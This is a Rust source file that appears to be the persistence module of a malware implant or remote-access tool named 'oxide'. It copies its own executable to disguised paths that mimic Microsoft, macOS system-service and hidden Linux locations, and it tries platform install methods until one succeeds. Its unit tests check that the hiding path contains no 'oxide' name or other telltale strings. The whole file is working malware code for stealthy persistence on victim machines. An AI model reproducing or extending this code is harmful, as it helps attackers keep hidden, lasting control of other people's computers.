use std::path::{Path, PathBuf};

#[cfg(target_os = "macos")]
pub mod darwin;
#[cfg(target_os = "linux")]
pub mod linux;
#[cfg(target_os = "windows")]
pub mod windows;

pub trait PersistenceTrait: Send + Sync {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()>;
    fn remove(&self) -> anyhow::Result<()>;
    fn check(&self) -> bool;
    fn name(&self) -> &'static str;
}

#[derive(Debug)]
pub struct PersistenceStatus {
    pub name: &'static str,
    pub installed: bool,
    pub error: Option<String>,
}

pub struct PersistenceChain {
    methods: Vec<Box<dyn PersistenceTrait>>,
}

impl PersistenceChain {
    pub fn new(methods: Vec<Box<dyn PersistenceTrait>>) -> Self {
        Self { methods }
    }

    /// Try each method in order; stop at first success.
    pub fn install_first_available(&self, binary_path: &Path) -> Vec<PersistenceStatus> {
        let mut results = Vec::new();
        for method in &self.methods {
            match method.install(binary_path) {
                Ok(()) => {
                    results.push(PersistenceStatus {
                        name: method.name(),
                        installed: true,
                        error: None,
                    });
                    return results;
                }
                Err(e) => {
                    results.push(PersistenceStatus {
                        name: method.name(),
                        installed: false,
                        error: Some(e.to_string()),
                    });
                }
            }
        }
        results
    }

    pub fn check_all(&self) -> Vec<PersistenceStatus> {
        self.methods
            .iter()
            .map(|m| PersistenceStatus {
                name: m.name(),
                installed: m.check(),
                error: None,
            })
            .collect()
    }

    pub fn remove_all(&self) -> Vec<PersistenceStatus> {
        self.methods
            .iter()
            .map(|m| match m.remove() {
                Ok(()) => PersistenceStatus {
                    name: m.name(),
                    installed: false,
                    error: None,
                },
                Err(e) => PersistenceStatus {
                    name: m.name(),
                    installed: m.check(),
                    error: Some(e.to_string()),
                },
            })
            .collect()
    }
}

pub fn stable_path() -> anyhow::Result<PathBuf> {
    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .map_err(|_| anyhow::anyhow!("HOME not set"))?;
    #[cfg(target_os = "windows")]
    let subpath = r"AppData\Local\Microsoft\WinDiagnostics\wdhost.exe";
    #[cfg(target_os = "macos")]
    let subpath = "Library/Application Support/SystemServices/svcmon";
    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
    let subpath = ".local/share/.sysmon/sys-update";
    Ok(PathBuf::from(home).join(subpath))
}

pub fn copy_to_stable_from(source: &Path) -> anyhow::Result<PathBuf> {
    let dest = stable_path()?;
    if let Some(parent) = dest.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::copy(source, &dest)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        // std::fs::copy copies permission bits from source, but we always want 0o755.
        std::fs::set_permissions(&dest, std::fs::Permissions::from_mode(0o755))?;
    }
    Ok(dest)
}

pub fn copy_to_stable() -> anyhow::Result<PathBuf> {
    copy_to_stable_from(&std::env::current_exe()?)
}

#[cfg(target_os = "linux")]
pub fn get_chain() -> PersistenceChain {
    linux::get_chain()
}
#[cfg(target_os = "windows")]
pub fn get_chain() -> PersistenceChain {
    windows::get_chain()
}
#[cfg(target_os = "macos")]
pub fn get_chain() -> PersistenceChain {
    darwin::get_chain()
}
#[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
pub fn get_chain() -> PersistenceChain {
    PersistenceChain::new(vec![])
}

#[cfg(test)]
mod tests {
    use super::*;

    struct AlwaysOk;
    impl PersistenceTrait for AlwaysOk {
        fn install(&self, _: &Path) -> anyhow::Result<()> {
            Ok(())
        }
        fn remove(&self) -> anyhow::Result<()> {
            Ok(())
        }
        fn check(&self) -> bool {
            true
        }
        fn name(&self) -> &'static str {
            "always_ok"
        }
    }

    struct AlwaysErr;
    impl PersistenceTrait for AlwaysErr {
        fn install(&self, _: &Path) -> anyhow::Result<()> {
            anyhow::bail!("blocked")
        }
        fn remove(&self) -> anyhow::Result<()> {
            Ok(())
        }
        fn check(&self) -> bool {
            false
        }
        fn name(&self) -> &'static str {
            "always_err"
        }
    }

    #[test]
    fn empty_chain_returns_empty() {
        assert!(PersistenceChain::new(vec![]).check_all().is_empty());
    }

    #[test]
    fn chain_stops_at_first_success() {
        let chain = PersistenceChain::new(vec![
            Box::new(AlwaysErr),
            Box::new(AlwaysOk),
            Box::new(AlwaysErr),
        ]);
        let r = chain.install_first_available(Path::new("/tmp/test"));
        assert_eq!(r.len(), 2);
        assert!(!r[0].installed);
        assert!(r[1].installed);
    }

    #[test]
    fn check_all_reflects_check_values() {
        let chain = PersistenceChain::new(vec![Box::new(AlwaysOk), Box::new(AlwaysErr)]);
        let r = chain.check_all();
        assert!(r[0].installed);
        assert!(!r[1].installed);
    }

    #[test]
    fn stable_path_has_no_oxide_identifier() {
        let p = stable_path().unwrap();
        let s = p.to_str().unwrap();
        assert!(!s.contains("oxide"), "stable path must not contain 'oxide': {s}");
        assert!(!s.contains("Roaming"), "must not use AppData\\Roaming: {s}");
        assert!(!s.contains("Update"), "must not use Update subdir: {s}");
    }

    #[test]
    fn copy_to_stable_from_creates_file() {
        let src = std::env::temp_dir().join("oxide-test-src");
        std::fs::write(&src, b"test").unwrap();
        let dest = copy_to_stable_from(&src).unwrap();
        assert!(dest.exists());
        let _ = std::fs::remove_file(&dest);
        let _ = std::fs::remove_file(&src);
    }
}
